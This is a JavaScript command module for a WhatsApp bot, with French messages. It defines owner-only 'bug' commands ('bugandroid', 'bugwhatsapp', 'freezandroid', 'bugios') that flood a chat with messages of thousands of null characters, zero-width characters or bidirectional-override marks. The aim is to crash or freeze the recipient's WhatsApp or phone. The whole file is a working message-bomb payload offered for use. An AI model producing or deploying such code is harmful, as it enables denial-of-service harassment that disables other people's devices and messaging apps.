const config = require("../../config");

const androidBug = "\u0000".repeat(2000);
const freezeText = "͏̵̶̷̸̡̢̧̨̛̤̥̦̩̪̫̬̭̮̯̰̱̲̳̜̝̞̟̠͇͈͉͍͎̙̘̗̖̕͜͟͢͠͡".repeat(100);

module.exports = {
  command: ["bugandroid", "bugwhatsapp", "bugios", "freezandroid", "restartandroid"],
  description: "Bug menu (Android/iOS/WhatsApp)",
  ownerOnly: true,
  execute: async ({ christ, from, msg, reply }) => {
    const cmd = msg.body.split(" ")[0].slice(config.prefix.length).toLowerCase();
    await reply(`⚠️ *BUG MENU - ${config.botName}*\n\n🔴 Commande: ${cmd}`);
    try {
      if (cmd === "bugandroid" || cmd === "bugwhatsapp") {
        for (let i = 0; i < 5; i++) {
          await christ.sendMessage(from, { text: androidBug + " " + i }, { quoted: msg.raw });
          await new Promise(r => setTimeout(r, 200));
        }
      } else if (cmd === "freezandroid") {
        const bigText = "​".repeat(65536);
        await christ.sendMessage(from, { text: bigText }, { quoted: msg.raw });
      } else if (cmd === "bugios") {
        const iosBug = "⁦" + "⁧⁩".repeat(2000) + "⁩";
        await christ.sendMessage(from, { text: iosBug }, { quoted: msg.raw });
      } else if (cmd === "restartandroid") {
        await christ.sendMessage(from, {
          image: { url: config.menuImage },
          caption: "🔄 *Restarting Android...*",
        }, { quoted: msg.raw });
      }
    } catch (e) {
      await reply(`❌ Erreur bug: ${e.message}`);
    }
  },
};
